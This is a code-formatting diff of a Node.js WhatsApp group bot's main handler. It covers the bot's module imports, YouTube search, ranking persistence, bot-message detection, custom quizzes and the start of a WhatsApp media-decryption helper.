@@ -1,198 +1,183 @@
-require('./config'); // load .env FIRST (in order) before anything reads process.env
-const fs = require('fs-extra');
-const yth2 = require('./modules/y2mate.js'); // Import downloadVideo from ytdl file
-const USER_DATA_FILE = './data/users.json';
-const fetchnews = require('./services/news');
+require("./config"); // load .env FIRST (in order) before anything reads process.env
+const fs = require("fs-extra");
+const yth2 = require("./modules/y2mate.js"); // Import downloadVideo from ytdl file
+const USER_DATA_FILE = "./data/users.json";
+const fetchnews = require("./services/news");
 const yts = async (query) => {
-    try {
-        const response = await fetch("https://hansaka1-ytdl.hf.space/search", {
-            "headers": {
-                "accept": "*/*",
-                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
-                "content-type": "application/json",
-                "priority": "u=1, i",
-                "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
-                "sec-ch-ua-mobile": "?0",
-                "sec-ch-ua-platform": "\"Windows\"",
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-storage-access": "none"
-            },
-            "referrer": "https://hansaka1-ytdl.hf.space/",
-            "body": JSON.stringify({
-                query: query
-            }),
-            "method": "POST",
-            "mode": "cors",
-            "credentials": "omit"
-        });
-        const data = await response.json();
-        return {
-            videos: (data.results || []).map(v => ({
-                title: v.title,
-                url: `https://www.youtube.com/watch?v=${v.videoId}`,
-                videoId: v.videoId,
-                timestamp: v.duration,
-                duration: {
-                    timestamp: v.duration
-                },
-                author: {
-                    name: v.channelName
-                },
-                thumbnail: v.thumbnail[0]?.url
-            }))
-        };
-    } catch (err) {
-        console.error("Youtube Search API error:", err);
-        return {
-            videos: []
-        };
-    }
+  try {
+    const response = await fetch("https://hansaka1-ytdl.hf.space/search", {
+      headers: {
+        accept: "*/*",
+        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "content-type": "application/json",
+        priority: "u=1, i",
+        "sec-ch-ua": '"Not=A?Brand";v="24", "Chromium";v="140"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "sec-fetch-storage-access": "none",
+      },
+      referrer: "https://hansaka1-ytdl.hf.space/",
+      body: JSON.stringify({
+        query: query,
+      }),
+      method: "POST",
+      mode: "cors",
+      credentials: "omit",
+    });
+    const data = await response.json();
+    return {
+      videos: (data.results || []).map((v) => ({
+        title: v.title,
+        url: `https://www.youtube.com/watch?v=${v.videoId}`,
+        videoId: v.videoId,
+        timestamp: v.duration,
+        duration: {
+          timestamp: v.duration,
+        },
+        author: {
+          name: v.channelName,
+        },
+        thumbnail: v.thumbnail[0]?.url,
+      })),
+    };
+  } catch (err) {
+    console.error("Youtube Search API error:", err);
+    return {
+      videos: [],
+    };
+  }
 };
-const mumaker = require('mumaker');
+const mumaker = require("mumaker");
 const { parsePhoneNumberFromString } = require("libphonenumber-js");
 
+const economy = require("./modules/economy.js");
+const shop = require("./modules/shop.js");
+const rpg = require("./modules/rpg.js");
+const tod = require("./modules/truthordare.js");
 
-
-const economy = require('./modules/economy.js');
-const shop = require('./modules/shop.js');
-const rpg = require('./modules/rpg.js');
-const tod = require('./modules/truthordare.js');
-
-const database = require('./services/database.js');
-const commandRegistry = require('./commands/registry.js');
-const userProfiles = require('./services/userProfiles.js');
-const groupDirectory = require('./services/groupDirectory.js');
+const database = require("./services/database.js");
+const commandRegistry = require("./commands/registry.js");
+const userProfiles = require("./services/userProfiles.js");
+const groupDirectory = require("./services/groupDirectory.js");
 const battlearena = require("./modules/battlearena.js");
-const weatherof = require('./modules/weather.js')
-const Assassin = require('./modules/assassin.js');
+const weatherof = require("./modules/weather.js");
+const Assassin = require("./modules/assassin.js");
 const { validStrengerss } = require("./modules/validStrengerss.js");
-const {
-    handleHangman,
-    checkInactiveGames
-} = require('./games/hangman.js');
-const fsp = require('fs').promises;
-const fonts = require('./modules/fonts.js')
+const { handleHangman, checkInactiveGames } = require("./games/hangman.js");
+const fsp = require("fs").promises;
+const fonts = require("./modules/fonts.js");
 const hangmanFile = "./data/hangman.json";
-const {
-    v4: uuidv4
-} = require('uuid');
+const { v4: uuidv4 } = require("uuid");
 
 const {
-    handleStartChain,
-    handleJoinChain,
-    handleStopChain,
-    handleChainGuess,
-    checkInactiveChainGames
-} = require('./modules/wordchain.js');
-const mafiaGame = require('./modules/mafia.js')
+  handleStartChain,
+  handleJoinChain,
+  handleStopChain,
+  handleChainGuess,
+  checkInactiveChainGames,
+} = require("./modules/wordchain.js");
+const mafiaGame = require("./modules/mafia.js");
 // Custom quiz packs are stored in MongoDB (like alexatg) instead of ./data/quizzes/*.json
-const { getCustomQuizModel } = require('./services/getcostomquiz.js');
-const {
-    promisify
-} = require('util');
-const validator = require('validator');
-const viewOnce = require('./modules/vv.js')
-const {
-    exec
-} = require('child_process');
+const { getCustomQuizModel } = require("./services/getcostomquiz.js");
+const { promisify } = require("util");
+const validator = require("validator");
+const viewOnce = require("./modules/vv.js");
+const { exec } = require("child_process");
 // const yth2 = require('./modules/ytHelper2');
-const {
-    muteCommand,
-    unmuteCommand
-} = require('./modules/mute.js')
-const {
-    warnUser,
-    checkWarns,
-    removeWarn
-} = require('./modules/warn.js')
-const {
-    getEmojicook
-} = require('./modules/emojicook.js');
-const {
-    Primbon
-} = require('scrape-primbon')
-const primbon = new Primbon()
+const { muteCommand, unmuteCommand } = require("./modules/mute.js");
+const { warnUser, checkWarns, removeWarn } = require("./modules/warn.js");
+const { getEmojicook } = require("./modules/emojicook.js");
+const { Primbon } = require("scrape-primbon");
+const primbon = new Primbon();
 const execAsync = promisify(exec);
-const questionsFile = './data/dailyQuestions.json';
-const QresponsesFile = './data/dailyqresp.json';
+const questionsFile = "./data/dailyQuestions.json";
+const QresponsesFile = "./data/dailyqresp.json";
 const upadestatusstate = {};
 const userreportingstate = {};
-const path = require('path');
-const quizManager = require('./modules/quizManager.js');
-const FilterManager = require('filtermatics');
-const si = require('os');
+const path = require("path");
+const quizManager = require("./modules/quizManager.js");
+const FilterManager = require("filtermatics");
+const si = require("os");
 // `free -h` compatible RAM reporting (used vs reclaimable buff/cache, cgroup
 // aware). Replaces the old totalmem()-freemem() maths that reported 93% on a
 // server that was actually 37% full.
-const memoryStats = require('./modules/memoryStats.js');
-const shippingflder = 'shipping'
-const axios = require('axios');
-const sharp = require('sharp');
+const memoryStats = require("./modules/memoryStats.js");
+const shippingflder = "shipping";
+const axios = require("axios");
+const sharp = require("sharp");
 const {
-    downloadMediaMessage,
-    proto,
-    jidNormalizedUser,
-    areJidsSameUser,
-    prepareWAMessageMedia,
-    getGroupMetadata,
-    generateWAMessageFromContent,
-    generateMessageID
-} = require('@hansaka02/baileys');
+  downloadMediaMessage,
+  proto,
+  jidNormalizedUser,
+  areJidsSameUser,
+  prepareWAMessageMedia,
+  getGroupMetadata,
+  generateWAMessageFromContent,
+  generateMessageID,
+} = require("@hansaka02/baileys");
 
-const monitnumbsPath = './data/monitnumbs.json';
+const monitnumbsPath = "./data/monitnumbs.json";
 if (!fs.existsSync(monitnumbsPath)) {
-    fs.writeFileSync(monitnumbsPath, JSON.stringify([]));
+  fs.writeFileSync(monitnumbsPath, JSON.stringify([]));
 }
 const monitnumbs = JSON.parse(fs.readFileSync(monitnumbsPath));
 
 /**
  * Safely downloads a media message with error handling and retries.
  */
-async function safeDownloadMedia(msg, type = "buffer", options = {}, fetchOptions = {}, retries = 2) {
-    for (let i = 0; i <= retries; i++) {
-        try {
-            const buffer = await downloadMediaMessage(msg, type, options, fetchOptions);
-            if (buffer) return buffer;
-        } catch (err) {
-            console.warn(`[MediaDownloader] Attempt ${i + 1} failed: ${err.message}`);
-            if (i === retries) {
-                console.error(`[MediaDownloader] All attempts failed for message ${msg.key.id}`);
-                return null;
-            }
-            await new Promise(resolve => setTimeout(resolve, 2000));
-        }
+async function safeDownloadMedia(
+  msg,
+  type = "buffer",
+  options = {},
+  fetchOptions = {},
+  retries = 2,
+) {
+  for (let i = 0; i <= retries; i++) {
+    try {
+      const buffer = await downloadMediaMessage(
+        msg,
+        type,
+        options,
+        fetchOptions,
+      );
+      if (buffer) return buffer;
+    } catch (err) {
+      console.warn(`[MediaDownloader] Attempt ${i + 1} failed: ${err.message}`);
+      if (i === retries) {
+        console.error(
+          `[MediaDownloader] All attempts failed for message ${msg.key.id}`,
+        );
+        return null;
+      }
+      await new Promise((resolve) => setTimeout(resolve, 2000));
     }
-    return null;
+  }
+  return null;
 }
 
-// 
-const {
-    generateLinkPreview
-} = require("link-preview-js");
+//
+const { generateLinkPreview } = require("link-preview-js");
 //const {generateWAMessageFromContent} = require('@adiwajshing/baileys')
 //const { Button, ButtonMessage } = require('@hansaka02/baileys').WA_MESSAGE_TYPE;
+const { fileutc } = require("./modules/fu.js");
+const { runSpeedTest } = require("./modules/speed_test.js");
+const FormData = require("form-data");
+const websearch_query = require("./services/websearch.js");
 const {
-    fileutc
-} = require('./modules/fu.js');
-const {
-    runSpeedTest
-} = require('./modules/speed_test.js')
-const FormData = require('form-data');
-const websearch_query = require('./services/websearch.js')
-const {
-    updateUser,
-    loadUserByNumber,
-    loadAllUsers,
-    loadAllGroups,
-    loadAllPrivateChats,
-    readUsersFile,
-    saveUsersjsonnn
-} = require('./modules/userscontact.js');
-const generatequote = require('./services/quoteGenerator.js')
-const chalk = require('kleur');
-const TEMP_DIR = path.join(__dirname, '..', 'temp');
+  updateUser,
+  loadUserByNumber,
+  loadAllUsers,
+  loadAllGroups,
+  loadAllPrivateChats,
+  readUsersFile,
+  saveUsersjsonnn,
+} = require("./modules/userscontact.js");
+const generatequote = require("./services/quoteGenerator.js");
+const chalk = require("kleur");
+const TEMP_DIR = path.join(__dirname, "..", "temp");
 // const {
 //     getVideoInfo,
 //     getFormats,
@@ -208,66 +193,99 @@ const TEMP_DIR = path.join(__dirname, '..', 'temp');
 
 //     downloadQualityToBuffer, // <-- NEW FUNCTION ADDED
 // } = require('./modules/ytHelper.js')
-const ai = require('./modules/Aii.js');
-const {
-    OpenAI
-} = require("openai");
+const ai = require("./modules/Aii.js");
+const { OpenAI } = require("openai");
 const mongo_url = process.env.mongo_url;
 const Filters = new FilterManager({
-    dbPath: mongo_url
+  dbPath: mongo_url,
 });
 
-const badwordNext = require('bad-words-next');
-const enbad = require('bad-words-next/lib/en');
+const badwordNext = require("bad-words-next");
+const enbad = require("bad-words-next/lib/en");
 
 const badwordceck = new badwordNext({
-    data: enbad
+  data: enbad,
 });
 
+const { mediafireDl } = require("./services/mediafire.js");
 const {
-    mediafireDl
-} = require('./services/mediafire.js')
-const { getCachedGroupMetadata, clearGroupCache, getCachedGroupSettings, clearSettingsCache } = require('./modules/cacheHelper.js');
-const {
-    isUrl
-} = require('./modules/func')
+  getCachedGroupMetadata,
+  clearGroupCache,
+  getCachedGroupSettings,
+  clearSettingsCache,
+} = require("./modules/cacheHelper.js");
+const { isUrl } = require("./modules/func");
 const hngmnwrds = [
-    "apple", "banana", "mountain", "ocean", "computer", "city", "dog", "cat", "book",
-    "window", "coffee", "phone", "table", "chair", "cloud", "rain", "snow", "butterfly",
-    "elephant", "pizza", "icecream", "flower", "chocolate", "guitar", "piano", "camera",
-    "jungle", "beach", "sunglasses", "umbrella", "garden", "airport", "hospital", "school",
-    "universe", "planet", "sun", "moon", "star", "television", "sandwich"
+  "apple",
+  "banana",
+  "mountain",
+  "ocean",
+  "computer",
+  "city",
+  "dog",
+  "cat",
+  "book",
+  "window",
+  "coffee",
+  "phone",
+  "table",
+  "chair",
+  "cloud",
+  "rain",
+  "snow",
+  "butterfly",
+  "elephant",
+  "pizza",
+  "icecream",
+  "flower",
+  "chocolate",
+  "guitar",
+  "piano",
+  "camera",
+  "jungle",
+  "beach",
+  "sunglasses",
+  "umbrella",
+  "garden",
+  "airport",
+  "hospital",
+  "school",
+  "universe",
+  "planet",
+  "sun",
+  "moon",
+  "star",
+  "television",
+  "sandwich",
 ];
 
 function formatTime(seconds) {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins}m ${secs}s`;
+  const mins = Math.floor(seconds / 60);
+  const secs = seconds % 60;
+  return `${mins}m ${secs}s`;
 }
-
-
-
 
 /**helpersss */
 fetchJson = async (url, options) => {
-    try {
-        options ? options : {}
-        const res = await axios({
-            method: 'GET',
-            url: url,
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
-            },
-            ...options
-        })
-        return res.data
-    } catch (err) {
-        return err
-    }
-}
+  try {
+    options ? options : {};
+    const res = await axios({
+      method: "GET",
+      url: url,
+      headers: {
+        "User-Agent":
+          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
+      },
+      ...options,
+    });
+    return res.data;
+  } catch (err) {
+    return err;
+  }
+};
 
-const RANKING_FOLDER = './database/rankings';
-const TIMEZONE = 'Asia/Colombo';
+const RANKING_FOLDER = "./database/rankings";
+const TIMEZONE = "Asia/Colombo";
 
 // --- CACHE SYSTEM ---
 // This holds the data in RAM while the bot is running
@@ -276,190 +294,182 @@ const rankingCache = {};
 const groupsToSave = new Set();
 
 // --- HELPER FUNCTIONS ---
-const getDayKey = () => moment().tz(TIMEZONE).format('YYYY-MM-DD');
-const getWeekKey = () => moment().tz(TIMEZONE).format('YYYY-WW');
+const getDayKey = () => moment().tz(TIMEZONE).format("YYYY-MM-DD");
+const getWeekKey = () => moment().tz(TIMEZONE).format("YYYY-WW");
 
 // --- THE SAVER INTERVAL (Runs every 1 minute) ---
 setInterval(() => {
-    if (groupsToSave.size === 0) return; // Nothing to save
+  if (groupsToSave.size === 0) return; // Nothing to save
 
-    // console.log(`[RANKING] Saving data for ${groupsToSave.size} groups...`);
+  // console.log(`[RANKING] Saving data for ${groupsToSave.size} groups...`);
 
-    groupsToSave.forEach(groupId => {
-        try {
-            const filePath = `${RANKING_FOLDER}/${groupId}.json`;
-            const data = rankingCache[groupId];
+  groupsToSave.forEach((groupId) => {
+    try {
+      const filePath = `${RANKING_FOLDER}/${groupId}.json`;
+      const data = rankingCache[groupId];
 
-            // Ensure folder exists (just in case)
-            if (!fs.existsSync(RANKING_FOLDER)) {
-                fs.mkdirSync(RANKING_FOLDER, {
-                    recursive: true
-                });
-            }
+      // Ensure folder exists (just in case)
+      if (!fs.existsSync(RANKING_FOLDER)) {
+        fs.mkdirSync(RANKING_FOLDER, {
+          recursive: true,
+        });
+      }
 
-            // Write from RAM to Disk
-            fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
-        } catch (err) {
-            console.error(`Failed to save ranking for ${groupId}:`, err);
-        }
-    });
+      // Write from RAM to Disk
+      fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+    } catch (err) {
+      console.error(`Failed to save ranking for ${groupId}:`, err);
+    }
+  });
 
-    // Clear the list after saving
-    groupsToSave.clear();
+  // Clear the list after saving
+  groupsToSave.clear();
 }, 60 * 1000); // 60 seconds * 1000 ms
 
 // 2. Define the Save Function
 const saveRankingCacheOnExit = () => {
-    if (typeof groupsToSave === 'undefined' || groupsToSave.size === 0) return;
+  if (typeof groupsToSave === "undefined" || groupsToSave.size === 0) return;
 
-    console.log(`[SYSTEM] Saving ${groupsToSave.size} ranking files before shutdown...`);
+  console.log(
+    `[SYSTEM] Saving ${groupsToSave.size} ranking files before shutdown...`,
+  );
 
-    // We use a simple loop to ensure it runs synchronously
-    groupsToSave.forEach(groupId => {
-        try {
-            const filePath = `${RANKING_FOLDER}/${groupId}.json`;
+  // We use a simple loop to ensure it runs synchronously
+  groupsToSave.forEach((groupId) => {
+    try {
+      const filePath = `${RANKING_FOLDER}/${groupId}.json`;
 
-            // Check if we have data for this group
-            if (rankingCache[groupId]) {
-                const data = rankingCache[groupId];
+      // Check if we have data for this group
+      if (rankingCache[groupId]) {
+        const data = rankingCache[groupId];
 
-                if (!fs.existsSync(RANKING_FOLDER)) {
-                    fs.mkdirSync(RANKING_FOLDER, {
-                        recursive: true
-                    });
-                }
-
-                // SYNC write is required for process.exit
-                fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
-            }
-        } catch (err) {
-            console.error(`Failed to save ranking for ${groupId}:`, err);
+        if (!fs.existsSync(RANKING_FOLDER)) {
+          fs.mkdirSync(RANKING_FOLDER, {
+            recursive: true,
+          });
         }
-    });
-    console.log('[SYSTEM] Ranking data saved successfully.');
+
+        // SYNC write is required for process.exit
+        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+      }
+    } catch (err) {
+      console.error(`Failed to save ranking for ${groupId}:`, err);
+    }
+  });
+  console.log("[SYSTEM] Ranking data saved successfully.");
 };
 
 // 3. IMPORTANT: Attach to Global Object so index.js can see it
 global.saveRankingCacheOnExit = saveRankingCacheOnExit;
 
 const isBotAllowed = async (groupId) => {
-    try {
-        const settings = await getCachedGroupSettings(db, groupId);
-        return !!settings?.is_allow_bots;
-    } catch (err) {
-        console.error("Error checking bot status:", err);
-        return false;
-    }
+  try {
+    const settings = await getCachedGroupSettings(db, groupId);
+    return !!settings?.is_allow_bots;
+  } catch (err) {
+    console.error("Error checking bot status:", err);
+    return false;
+  }
 };
 
 function isBotOrFakeWeb(msg) {
-    const id = msg.key.id;
-    if (!id) return false;
+  const id = msg.key.id;
+  if (!id) return false;
 
-
-    if (id.startsWith('3EB0') && id.length < 23) {
-        return true;
-    } if (id.startsWith('SANKA')) {
-        return true;
-    } if (id.startsWith('ELRAY')) {
-        return true;
-    } if (id.length < 20) {
-        return true;
-    } if (id.length < 21 && !id.startsWith('3A')) {
-        return true;
-    } if (id.startsWith('BAE5')) {
-        return true;
-    } if (id.startsWith('ILSYM')) {
-        return true;
-    } else {
-        return false;
-    }
-
-
+  if (id.startsWith("3EB0") && id.length < 23) {
+    return true;
+  }
+  if (id.startsWith("SANKA")) {
+    return true;
+  }
+  if (id.startsWith("ELRAY")) {
+    return true;
+  }
+  if (id.length < 20) {
+    return true;
+  }
+  if (id.length < 21 && !id.startsWith("3A")) {
+    return true;
+  }
+  if (id.startsWith("BAE5")) {
+    return true;
+  }
+  if (id.startsWith("ILSYM")) {
+    return true;
+  } else {
+    return false;
+  }
 }
-
-
-
-
-
-
-
-
-
-
-
-
 
 async function startCustomQuiz(AlexaInc, jid, quizId) {
-    const CustomQuizModel = getCustomQuizModel();
+  const CustomQuizModel = getCustomQuizModel();
 
-    if (!CustomQuizModel) {
-        return AlexaInc.sendMessage(jid, {
-            text: `❌ Custom quizzes are not available (DB not connected).`
-        });
+  if (!CustomQuizModel) {
+    return AlexaInc.sendMessage(jid, {
+      text: `❌ Custom quizzes are not available (DB not connected).`,
+    });
+  }
+
+  try {
+    // Load the quiz pack from MongoDB (.lean() -> plain JSON, exactly like the old file)
+    const quizDoc = await CustomQuizModel.findOne({
+      quizId,
+    }).lean();
+
+    if (!quizDoc) {
+      return AlexaInc.sendMessage(jid, {
+        text: `❌ Quiz ID *${quizId}* not found.`,
+      });
     }
 
-    try {
-        // Load the quiz pack from MongoDB (.lean() -> plain JSON, exactly like the old file)
-        const quizDoc = await CustomQuizModel.findOne({
-            quizId
-        }).lean();
+    const customQuestions = quizDoc.questions;
 
-        if (!quizDoc) {
-            return AlexaInc.sendMessage(jid, {
-                text: `❌ Quiz ID *${quizId}* not found.`
-            });
-        }
-
-        const customQuestions = quizDoc.questions;
-
-        if (!isValidQuizFormat(customQuestions)) {
-            return AlexaInc.sendMessage(jid, {
-                text: `❌ Quiz ID *${quizId}* is corrupt or invalid. Please check the quiz data.`
-            });
-        }
-
-        // 🚨 IMPORTANT: Temporarily overwrite the quizManager's question set
-        quizManager.setQuestions(customQuestions);
-
-        // Start the quiz with the custom set
-        await quizManager.startQuiz(AlexaInc, jid);
-
-        // Reset to default questions after the quiz starts (or after a delay if needed)
-        // For simplicity, we assume you might want to load a default set later.
-        // For now, let's keep the custom quiz set until the next /setquiz or restart.
-
-    } catch (e) {
-        console.error(`Error loading custom quiz ${quizId}:`, e.message);
-        return AlexaInc.sendMessage(jid, {
-            text: `❌ An error occurred while loading Quiz ID *${quizId}*.`
-        });
+    if (!isValidQuizFormat(customQuestions)) {
+      return AlexaInc.sendMessage(jid, {
+        text: `❌ Quiz ID *${quizId}* is corrupt or invalid. Please check the quiz data.`,
+      });
     }
+
+    // 🚨 IMPORTANT: Temporarily overwrite the quizManager's question set
+    quizManager.setQuestions(customQuestions);
+
+    // Start the quiz with the custom set
+    await quizManager.startQuiz(AlexaInc, jid);
+
+    // Reset to default questions after the quiz starts (or after a delay if needed)
+    // For simplicity, we assume you might want to load a default set later.
+    // For now, let's keep the custom quiz set until the next /setquiz or restart.
+  } catch (e) {
+    console.error(`Error loading custom quiz ${quizId}:`, e.message);
+    return AlexaInc.sendMessage(jid, {
+      text: `❌ An error occurred while loading Quiz ID *${quizId}*.`,
+    });
+  }
 }
 
-const statusFile = path.join(__dirname, '..', 'data', 'botstatus.json');
+const statusFile = path.join(__dirname, "..", "data", "botstatus.json");
 
 /**
  * Load the current bot status
  * @returns {Object} { underMaintenance: boolean, message: string }
  */
 function loadBotStatus() {
-    try {
-        if (!fs.existsSync(statusFile)) {
-            return {
-                underMaintenance: false,
-                message: 'Bot is running smoothly.'
-            };
-        }
-        const data = fs.readFileSync(statusFile, 'utf-8');
-        return JSON.parse(data);
-    } catch (err) {
-        console.error('Error loading bot status:', err);
-        return {
-            underMaintenance: false,
-            message: 'Bot is running smoothly.'
-        };
+  try {
+    if (!fs.existsSync(statusFile)) {
+      return {
+        underMaintenance: false,
+        message: "Bot is running smoothly.",
+      };
     }
+    const data = fs.readFileSync(statusFile, "utf-8");
+    return JSON.parse(data);
+  } catch (err) {
+    console.error("Error loading bot status:", err);
+    return {
+      underMaintenance: false,
+      message: "Bot is running smoothly.",
+    };
+  }
 }
 
 /**
@@ -468,61 +478,62 @@ function loadBotStatus() {
  * @param {string} message - custom message to show users
  */
 function updateBotStatus(maintenance, message) {
-    const newStatus = {
-        underMaintenance: maintenance,
-        message: message || (maintenance ? 'Bot under maintenance.' : 'Bot is active.')
-    };
+  const newStatus = {
+    underMaintenance: maintenance,
+    message:
+      message || (maintenance ? "Bot under maintenance." : "Bot is active."),
+  };
 
-    fs.writeFileSync(statusFile, JSON.stringify(newStatus, null, 2));
-    console.log('✅ Bot status updated:', newStatus);
+  fs.writeFileSync(statusFile, JSON.stringify(newStatus, null, 2));
+  console.log("✅ Bot status updated:", newStatus);
 }
 
-const crypto = require('crypto')
+const crypto = require("crypto");
 
 function parseToBuffer(value) {
-    if (!value) return null;
-    if (typeof value === 'string') {
-        // check if it's base64 or numeric list
-        if (value.includes(',')) {
-            const arr = value.split(',').map(v => parseInt(v.trim(), 10));
-            return Buffer.from(arr);
-        } else {
-            // assume base64
-            return Buffer.from(value, 'base64');
-        }
-    } else if (Array.isArray(value)) {
-        return Buffer.from(value);
+  if (!value) return null;
+  if (typeof value === "string") {
+    // check if it's base64 or numeric list
+    if (value.includes(",")) {
+      const arr = value.split(",").map((v) => parseInt(v.trim(), 10));
+      return Buffer.from(arr);
     } else {
-        return Buffer.isBuffer(value) ? value : null;
+      // assume base64
+      return Buffer.from(value, "base64");
     }
+  } else if (Array.isArray(value)) {
+    return Buffer.from(value);
+  } else {
+    return Buffer.isBuffer(value) ? value : null;
+  }
 }
 
 /**
  * Convert base64 or comma-separated numeric string to Buffer
  */
 function parseToBuffer(value) {
-    if (!value) return null;
-    if (typeof value === 'string') {
-        if (value.includes(',')) {
-            return Buffer.from(value.split(',').map(n => parseInt(n.trim(), 10)));
-        }
-        return Buffer.from(value, 'base64');
+  if (!value) return null;
+  if (typeof value === "string") {
+    if (value.includes(",")) {
+      return Buffer.from(value.split(",").map((n) => parseInt(n.trim(), 10)));
     }
-    if (Array.isArray(value)) return Buffer.from(value);
-    if (Buffer.isBuffer(value)) return value;
-    return null;
+    return Buffer.from(value, "base64");
+  }
+  if (Array.isArray(value)) return Buffer.from(value);
+  if (Buffer.isBuffer(value)) return value;
+  return null;
 }
 
 /**
  * Automatically determines correct message type from MIME
  */
 function getMessageType(mimetype) {
-    if (!mimetype) return 'documentMessage';
-    if (mimetype.startsWith('image/')) return 'imageMessage';
-    if (mimetype.startsWith('video/')) return 'videoMessage';
-    if (mimetype.startsWith('audio/')) return 'audioMessage';
-    if (mimetype.startsWith('application/')) return 'documentMessage';
-    return 'documentMessage';
+  if (!mimetype) return "documentMessage";
+  if (mimetype.startsWith("image/")) return "imageMessage";
+  if (mimetype.startsWith("video/")) return "videoMessage";
+  if (mimetype.startsWith("audio/")) return "audioMessage";
+  if (mimetype.startsWith("application/")) return "documentMessage";
+  return "documentMessage";
 }
 
 /**
@@ -530,828 +541,925 @@ function getMessageType(mimetype) {
  * Supports both base64 & numeric-key formats
  */
 async function getDecryptedMediaBuffer(client, data) {
-    try {
-        const {
-            mediaUrl,
-            mediaMimetype,
-            mediaKey,
-            mediaFileEncSha256,
-            mediaFileSha256,
-            messageId
-        } = data;
+  try {
+    const {
+      mediaUrl,
+      mediaMimetype,
+      mediaKey,
+      mediaFileEncSha256,
+      mediaFileSha256,
+      messageId,
+    } = data;
 
-        // ---------- self-contained helpers (no new globals) ----------
-        const __crypto = require('crypto');
-        const __asBuf = (d) => { // Buffer-first (your caller pre-buffers), strings tolerated
-            if (!d) return null;
-            if (Buffer.isBuffer(d)) return d;
-            if (d instanceof Uint8Array) return Buffer.from(d);
-            if (Array.isArray(d)) return Buffer.from(d);
-            if (typeof d === 'string') {
-                const s = d.trim();
-                if (!s) return null;
-                if (/^-?\d+(\s*,\s*-?\d+)+$/.test(s)) return Buffer.from(s.split(',').map(x => Number(x.trim())));
-                return Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64');
-            }
-            if (typeof d === 'object' && d.type === 'Buffer' && Array.isArray(d.data)) return Buffer.from(d.data);
-            return Buffer.from(d);
-        };
-        const __hkdf = (key, len, info) => {
-            const prk = __crypto.createHmac('sha256', Buffer.alloc(32, 0)).update(key).digest();
-            let okm = Buffer.alloc(0), prev = Buffer.alloc(0), c = 1;
-            while (okm.length < len) {
-                const h = __crypto.createHmac('sha256', prk);
-                h.update(prev); h.update(Buffer.from(info, 'utf-8')); h.update(Buffer.from([c]));
-                prev = h.digest(); okm = Buffer.concat([okm, prev]); c++;
-            }
-            return okm.slice(0, len);
-        };
-        const __appInfo = (m) => {
-            const t = (m || '').split(';')[0].trim().toLowerCase();
-            if (t.startsWith('image/')) return 'WhatsApp Image Keys';
-            if (t.startsWith('video/')) return 'WhatsApp Video Keys';
-            if (t.startsWith('audio/')) return 'WhatsApp Audio Keys';
-            return 'WhatsApp Document Keys';
-        };
-        const __msgType = (m) => {
-            const t = (m || '').split(';')[0].trim().toLowerCase();
-            if (t === 'image/webp') return 'stickerMessage';
-            if (t.startsWith('image/')) return 'imageMessage';
-            if (t.startsWith('video/')) return 'videoMessage';
-            if (t.startsWith('audio/')) return 'audioMessage';
-            return 'documentMessage';
-        };
-        const __detect = (b) => { // real type from magic bytes
-            if (b.length > 12 && b[0] === 0x52 && b[1] === 0x49 && b[2] === 0x46 && b[3] === 0x46 && b.slice(8, 12).toString() === 'WEBP') return { mimetype: 'image/webp', ext: 'webp' };
-            if (b[0] === 0xFF && b[1] === 0xD8 && b[2] === 0xFF) return { mimetype: 'image/jpeg', ext: 'jpg' };
-            if (b[0] === 0x89 && b[1] === 0x50 && b[2] === 0x4E && b[3] === 0x47) return { mimetype: 'image/png', ext: 'png' };
-            if (b.slice(0, 3).toString() === 'GIF') return { mimetype: 'image/gif', ext: 'gif' };
-            if (b.length > 12 && b.slice(4, 8).toString() === 'ftyp') return { mimetype: 'video/mp4', ext: 'mp4' };
-            if (b.slice(0, 4).toString() === 'OggS') return { mimetype: 'audio/ogg', ext: 'ogg' };
-            if (b.slice(0, 3).toString() === 'ID3' || (b[0] === 0xFF && (b[1] & 0xE0) === 0xE0)) return { mimetype: 'audio/mpeg', ext: 'mp3' };
-            if (b.slice(0, 4).toString() === '%PDF') return { mimetype: 'application/pdf', ext: 'pdf' };
-            return { mimetype: mediaMimetype, ext: (mediaMimetype || '').split('/')[1]?.split(';')[0] || 'bin' };
-        };
-        const __tag = (plain) => { // attach detected type (non-breaking) + warn on mismatch
-            const det = __detect(plain);
-            try {
-                plain.detectedMimetype = det.mimetype;
-                plain.detectedExt = det.ext;
-            } catch (_) { /* ignore */ }
-            const declared = (mediaMimetype || '').split(';')[0].trim().toLowerCase();
-            if (declared && det.mimetype !== declared) {
-                console.warn(`⚠️ mimetype mismatch: declared "${declared}" but bytes are "${det.mimetype}" — save/send as .${det.ext}, not as declared type (wrong type renders BLACK/broken)`);
-            }
-            return plain;
-        };
-        // ------------------------------------------------------------------
+    // ---------- self-contained helpers (no new globals) ----------
+    const __crypto = require("crypto");
+    const __asBuf = (d) => {
+      // Buffer-first (your caller pre-buffers), strings tolerated
+      if (!d) return null;
+      if (Buffer.isBuffer(d)) return d;
+      if (d instanceof Uint8Array) return Buffer.from(d);
+      if (Array.isArray(d)) return Buffer.from(d);
+      if (typeof d === "string") {
+        const s = d.trim();
+        if (!s) return null;
+        if (/^-?\d+(\s*,\s*-?\d+)+$/.test(s))
+          return Buffer.from(s.split(",").map((x) => Number(x.trim())));
+        return Buffer.from(s.replace(/-/g, "+").replace(/_/g, "/"), "base64");
+      }
+      if (typeof d === "object" && d.type === "Buffer" && Array.isArray(d.data))
+        return Buffer.from(d.data);
+      return Buffer.from(d);
+    };
